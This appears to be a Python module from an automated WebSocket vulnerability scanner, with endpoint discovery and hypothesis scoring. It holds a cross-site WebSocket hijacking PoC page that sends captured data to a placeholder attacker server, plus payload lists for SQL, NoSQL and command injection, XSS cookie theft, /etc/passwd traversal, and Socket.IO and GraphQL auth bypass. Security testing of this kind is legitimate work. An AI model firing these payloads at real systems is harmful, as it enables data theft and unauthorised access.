"""WebSocket Tester - Real-time protocol vulnerability testing for Project Triage v4.

Tests for:
- Cross-Site WebSocket Hijacking (CSWSH)
- WebSocket injection (SQLi, XSS, command injection via WS messages)
- Authentication bypass (missing auth on WS upgrade)
- Authorization bypass (accessing other users' channels)
- Race conditions via concurrent WebSocket messages
- Socket.IO specific vulnerabilities
- GraphQL subscription abuse

Research basis: R4.2 - WebSocket and real-time protocol testing.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlparse, urlencode


@dataclass
class WSEndpoint:
    """A discovered WebSocket endpoint."""
    url: str  # ws:// or wss://
    protocol: str  # "websocket", "socket.io", "graphql-ws"
    auth_mechanism: str  # "cookie", "token_param", "bearer_header", "none"
    origin_validated: bool
    csrf_protected: bool


@dataclass
class WSVulnerability:
    """A discovered WebSocket vulnerability."""
    endpoint: str
    vuln_type: str
    severity: str
    description: str
    poc_html: str = ""  # HTML PoC for CSWSH
    evidence: str = ""


# ---------------------------------------------------------------------------
# CSWSH detection
# ---------------------------------------------------------------------------

CSWSH_POC_TEMPLATE = """<!DOCTYPE html>
<html>
<body>
<script>
var ws = new WebSocket("{ws_url}");
ws.onopen = function() {{
    ws.send(JSON.stringify({probe_message}));
}};
ws.onmessage = function(event) {{
    // Exfiltrate data to attacker server
    fetch("https://ATTACKER_SERVER/exfil?data=" + encodeURIComponent(event.data));
    document.getElementById("output").textContent += event.data + "\\n";
}};
</script>
<pre id="output">Waiting for WebSocket data...</pre>
</body>
</html>"""


# ---------------------------------------------------------------------------
# WebSocket injection payloads
# ---------------------------------------------------------------------------

WS_INJECTION_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        '{"query": "SELECT * FROM users WHERE id=1 OR 1=1--"}',
        '{"search": "\' OR \'1\'=\'1"}',
        '{"id": "1 UNION SELECT username,password FROM users--"}',
    ],
    "xss": [
        '{"message": "<img src=x onerror=alert(1)>"}',
        '{"name": "<script>alert(document.cookie)</script>"}',
        '{"content": "\\"><svg onload=alert(1)>"}',
    ],
    "command_injection": [
        '{"cmd": "; id"}',
        '{"file": "test; cat /etc/passwd"}',
        '{"path": "$(whoami)"}',
    ],
    "path_traversal": [
        '{"file": "../../../etc/passwd"}',
        '{"path": "....//....//....//etc/passwd"}',
    ],
    "nosql_injection": [
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        '{"$where": "this.password.match(/.*/)"}',
    ],
    "idor": [
        '{"user_id": "OTHER_USER_ID"}',
        '{"channel": "admin-channel"}',
        '{"room": "private-room-1"}',
    ],
}


# ---------------------------------------------------------------------------
# Socket.IO specific patterns
# ---------------------------------------------------------------------------

SOCKETIO_PATTERNS: list[dict[str, Any]] = [
    {
        "name": "event_injection",
        "description": "Emit events that should be server-only (admin actions)",
        "test_events": [
            '42["admin:deleteUser",{"userId":"victim_id"}]',
            '42["debug:eval",{"code":"process.env"}]',
            '42["internal:getConfig",{}]',
        ],
        "severity": "high",
    },
    {
        "name": "room_join_bypass",
        "description": "Join private rooms without authorization",
        "test_events": [
            '42["join",{"room":"admin"}]',
            '42["subscribe",{"channel":"private-notifications"}]',
        ],
        "severity": "high",
    },
    {
        "name": "transport_downgrade",
        "description": "Force polling transport to bypass WebSocket protections",
        "test_url_suffix": "?EIO=4&transport=polling",
        "severity": "medium",
    },
]


# ---------------------------------------------------------------------------
# GraphQL subscription patterns
# ---------------------------------------------------------------------------

GRAPHQL_WS_PATTERNS: list[dict[str, Any]] = [
    {
        "name": "subscription_auth_bypass",
        "description": "Subscribe to data streams without proper authentication",
        "test_messages": [
            '{"type":"connection_init","payload":{}}',
            '{"id":"1","type":"subscribe","payload":{"query":"subscription{userUpdated{id email}}"}}',
            '{"id":"2","type":"subscribe","payload":{"query":"subscription{orderCreated{id total customerId}}"}}',
        ],
        "severity": "high",
    },
    {
        "name": "introspection_via_ws",
        "description": "Run introspection queries over WebSocket when HTTP blocks them",
        "test_messages": [
            '{"id":"1","type":"subscribe","payload":{"query":"{__schema{types{name fields{name}}}}"}}',
        ],
        "severity": "medium",
    },
]


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class WebSocketTester:
    """WebSocket and real-time protocol vulnerability tester."""

    def discover_ws_endpoints(
        self,
        target_url: str,
        js_content: str = "",
        endpoints: list[str] | None = None,
    ) -> list[WSEndpoint]:
        """Discover WebSocket endpoints from JS analysis and endpoint list."""
        found: list[WSEndpoint] = []
        parsed = urlparse(target_url)
        base_ws = f"wss://{parsed.netloc}" if parsed.scheme == "https" else f"ws://{parsed.netloc}"

        # Only add common WebSocket paths if there's evidence of WebSocket usage
        # in JS content or endpoint list. Blindly guessing paths wastes the budget.
        has_ws_evidence = False
        if js_content:
            ws_keywords = ["websocket", "socket.io", "ws://", "wss://", "WebSocket(",
                          "io.connect", "ActionCable", "signalr", "sockjs"]
            has_ws_evidence = any(kw.lower() in js_content.lower() for kw in ws_keywords)
        if endpoints:
            has_ws_evidence = has_ws_evidence or any(
                any(kw in ep.lower() for kw in ["socket", "ws", "cable", "hub"])
                for ep in endpoints
            )

        if has_ws_evidence:
            common_paths = [
                "/ws", "/websocket", "/socket",
                "/socket.io/?EIO=4&transport=websocket",
                "/graphql",
                "/cable",
                "/hub",
            ]
            for path in common_paths:
                url = f"{base_ws}{path}"
                protocol = "websocket"
                if "socket.io" in path:
                    protocol = "socket.io"
                elif "graphql" in path:
                    protocol = "graphql-ws"
                elif "cable" in path:
                    protocol = "actioncable"
                elif "hub" in path:
                    protocol = "signalr"

                found.append(WSEndpoint(
                    url=url,
                    protocol=protocol,
                    auth_mechanism="unknown",
                    origin_validated=False,
                    csrf_protected=False,
                ))

        # Extract from JS content
        if js_content:
            ws_matches = re.findall(
                r"wss?://[a-zA-Z0-9._/-]+(?:\?[a-zA-Z0-9._=&/-]*)?",
                js_content,
            )
            for match in ws_matches:
                if match not in [e.url for e in found]:
                    found.append(WSEndpoint(
                        url=match,
                        protocol="websocket",
                        auth_mechanism="unknown",
                        origin_validated=False,
                        csrf_protected=False,
                    ))

        # Check provided endpoints for WS upgrade potential
        if endpoints:
            for ep in endpoints:
                if any(kw in ep.lower() for kw in ["socket", "ws", "stream", "live", "real"]):
                    ws_url = f"{base_ws}{ep}" if ep.startswith("/") else ep
                    if ws_url not in [e.url for e in found]:
                        found.append(WSEndpoint(
                            url=ws_url,
                            protocol="websocket",
                            auth_mechanism="unknown",
                            origin_validated=False,
                            csrf_protected=False,
                        ))

        return found

    def generate_cswsh_poc(self, ws_url: str, probe_message: str = '{"type":"ping"}') -> str:
        """Generate a CSWSH proof-of-concept HTML page."""
        return CSWSH_POC_TEMPLATE.format(
            ws_url=ws_url,
            probe_message=probe_message,
        )

    def get_injection_tests(self, ws_url: str) -> list[dict[str, Any]]:
        """Generate injection test payloads for a WebSocket endpoint."""
        tests = []
        for vuln_type, payloads in WS_INJECTION_PAYLOADS.items():
            for payload in payloads:
                tests.append({
                    "ws_url": ws_url,
                    "type": f"ws_{vuln_type}",
                    "payload": payload,
                    "description": f"WebSocket {vuln_type} injection test",
                })
        return tests

    def get_socketio_tests(self, base_url: str) -> list[dict[str, Any]]:
        """Generate Socket.IO-specific tests."""
        tests = []
        for pattern in SOCKETIO_PATTERNS:
            for event in pattern.get("test_events", []):
                tests.append({
                    "url": base_url,
                    "type": f"socketio_{pattern['name']}",
                    "payload": event,
                    "severity": pattern["severity"],
                    "description": pattern["description"],
                })
        return tests

    def get_graphql_ws_tests(self, ws_url: str) -> list[dict[str, Any]]:
        """Generate GraphQL-over-WebSocket tests."""
        tests = []
        for pattern in GRAPHQL_WS_PATTERNS:
            tests.append({
                "ws_url": ws_url,
                "type": f"graphql_ws_{pattern['name']}",
                "messages": pattern["test_messages"],
                "severity": pattern["severity"],
                "description": pattern["description"],
            })
        return tests

    def generate_hypotheses(
        self,
        target_url: str,
        ws_endpoints: list[WSEndpoint],
        tech_stack: dict[str, Any],
    ) -> list[dict[str, Any]]:
        """Generate WebSocket-related hypotheses for the attack graph."""
        hypotheses = []

        for ep in ws_endpoints:
            # CSWSH test (always)
            hypotheses.append({
                "endpoint": ep.url,
                "technique": "cswsh",
                "description": f"Cross-Site WebSocket Hijacking on {ep.url} ({ep.protocol})",
                "novelty": 7, "exploitability": 8, "impact": 9, "effort": 2,
            })

            # Injection tests
            hypotheses.append({
                "endpoint": ep.url,
                "technique": "ws_injection",
                "description": f"WebSocket injection testing (SQLi, XSS, cmd) on {ep.url}",
                "novelty": 6, "exploitability": 7, "impact": 8, "effort": 3,
            })

            # Auth bypass
            hypotheses.append({
                "endpoint": ep.url,
                "technique": "ws_auth_bypass",
                "description": f"WebSocket auth bypass - test connection without credentials on {ep.url}",
                "novelty": 7, "exploitability": 8, "impact": 9, "effort": 2,
            })

            # Protocol-specific tests
            if ep.protocol == "socket.io":
                hypotheses.append({
                    "endpoint": ep.url,
                    "technique": "socketio_event_injection",
                    "description": "Socket.IO event injection - emit admin/debug events",
                    "novelty": 8, "exploitability": 7, "impact": 9, "effort": 3,
                })
            elif ep.protocol == "graphql-ws":
                hypotheses.append({
                    "endpoint": ep.url,
                    "technique": "graphql_subscription_bypass",
                    "description": "GraphQL subscription auth bypass - subscribe to protected data streams",
                    "novelty": 8, "exploitability": 8, "impact": 9, "effort": 3,
                })

        # Race condition via WS
        if ws_endpoints:
            hypotheses.append({
                "endpoint": ws_endpoints[0].url,
                "technique": "ws_race_condition",
                "description": "Race condition via concurrent WebSocket messages",
                "novelty": 8, "exploitability": 7, "impact": 8, "effort": 4,
            })

        return hypotheses
